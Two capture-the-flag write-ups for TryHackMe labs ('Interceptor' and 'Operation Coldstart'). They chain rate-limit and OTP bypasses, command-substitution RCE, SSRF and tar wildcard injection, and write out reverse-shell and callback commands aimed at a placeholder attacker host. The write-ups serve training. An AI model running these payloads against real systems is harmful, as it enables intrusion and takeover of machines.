TryHackMe — Interceptor

Virtual-host enumeration to unlock a proper attack surface, backup file discovery for admin credentials, rate-limit bypass via header manipulation, OTP bypass through mass assignment, and command substitution RCE via a feed import feature. 2 / 2 flags.

TryHackMe Medium 2 / 2 Flags Linux Jr Pentester

// 01 — recon

Nmap revealed SSH (22), DNS/BIND (53), and Apache HTTP (80). Gobuster against the IP returned wildcard 200 responses for every path — a clear sign the app uses virtual hosting and only responds properly via its hostname. Adding interceptor.thm to /etc/hosts and re-running gobuster with multiple extensions revealed the real attack surface.

echo "10.64.146.105 interceptor.thm" >> /etc/hosts gobuster dir -u http://interceptor.thm -w directory-list-2.3-medium.txt -x php,php.bak,bak --exclude-length 1491

Key endpoints: /login.php, /otp.php, /dashboard.php, and crucially — /login.php.bak.

Virtual Host EnumBackup File Discovery

// 02 — backup file → credentials

Fetching /login.php.bak exposed a developer note left in the source before production deployment:

Admin test account for staging environment Email: admin@mediahub.thm Password policy reminder: Admin password follows company format: MediaHub + any year

Password candidates: MediaHub2024, MediaHub2025, MediaHub2026. Always enumerate backup file extensions — .bak, .old, .orig, ~, .swp.

Information DisclosureBackup File Exposure

// 03 — rate limit bypass → login

The login form rate-limited attempts by IP. Bypassed by spoofing the source IP via the X-Forwarded-For header — a common misconfiguration where apps trust this header for rate limiting instead of the real TCP connection IP.

curl -X POST http://interceptor.thm/api_login.php \ -H "X-Forwarded-For: 1.1.1.1" \ -d "email=admin@mediahub.thm&password=MediaHub2026"
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}

// 04 — OTP bypass via mass assignment → flag 1

After login, the app redirected to /otp.php. Intercepting the OTP POST request in Burp Repeater revealed it submitted an otp field. The server had a mass assignment vulnerability — it blindly bound any user-supplied parameter directly to internal session state.

Instead of submitting a valid OTP, the field name was changed to is_verified with value true:

Content-Disposition: form-data; name="is_verified" true
{"ok":true,"message":"OTP verified. Redirecting..."}

Dashboard unlocked. Flag 1: THM{ADMIN_ACCESS_USING_BURP}

// 05 — command substitution RCE → flag 2

The dashboard exposed an "Import Feed" feature that fetched URLs server-side. The JavaScript filtered ;, &, and | — but only client-side, and none of $, (, or ) were blocked. The server passed the URL directly to a curl-like shell command.

Command substitution $() executes a command and inserts its output — bypassing the IP validation entirely:

# Verify RCE — check for callback http://127.1$(curl http://<attacker>) # Reverse shell http://127.1$(busybox nc <attacker> 4444 -e bash)

Shell received as www-data. Flag 2 at /var/www/user.txt.

TryHackMe — Operation Coldstart

FTP anonymous login exposed app source code revealing an SSRF vulnerability with an internal admin endpoint. Chained SSRF to leak SSH credentials, then escalated via tar wildcard injection in a root cron job. Flags captured.

TryHackMe Medium Linux Boot2Root SSRF

// 01 — recon

Nmap revealed FTP (21) with anonymous login allowed, SSH (22), and a Python/gunicorn app on HTTP (80) titled "URL Preview - Volt Labs". Gobuster found /admin (308) and /preview (400). FTP anonymous login exposed a backup.tar.gz in the pub directory.

ftp anonymous@<target-ip> cd pub get backup.tar.gz

// 02 — source code analysis → SSRF

Extracting the backup revealed the full Flask app source (app.py). Key findings in the code:

  • ALLOWED_HOSTS = {"kestrel.thm"} — only this hostname is allowed
  • kestrel.thm resolves to 127.0.0.1 via the target's /etc/hosts
  • /admin/notes reads /opt/voltlabs-preview/admin_notes.txt — only accessible from 127.x.x.x
  • The comment literally said # VULN: hostname allow-list is the only check

Chaining these: submitting http://kestrel.thm/admin/notes to the preview endpoint makes the server fetch its own admin endpoint from localhost, bypassing the IP restriction.

http://kestrel.thm/admin/notes
=== INTERNAL === SSH access for staging: user: webdev pass: V0ltLabs#summer
SSRFSource Code DisclosureFTP Anonymous

// 03 — tar wildcard injection → root

SSH'd in as webdev. A custom cron job ran every minute as root:

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *

The * wildcard expands to all filenames in /opt/backups. webdev had write access. Creating files named after tar flags causes them to be interpreted as command-line arguments when the wildcard expands:

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker> 4444 >/tmp/f' > /opt/backups/shell.sh touch /opt/backups/--checkpoint=1 touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"

Within one minute cron fired, tar executed the shell script as root, and a root shell landed on the listener.

Tar Wildcard InjectionCron PrivEsc

// attack chain

—FTP anonymous login → backup.tar.gz → Flask app source
—Source code reveals SSRF + internal admin endpoint
—SSRF via http://kestrel.thm/admin/notes → SSH credentials
★Tar wildcard injection in writable cron directory → root shell
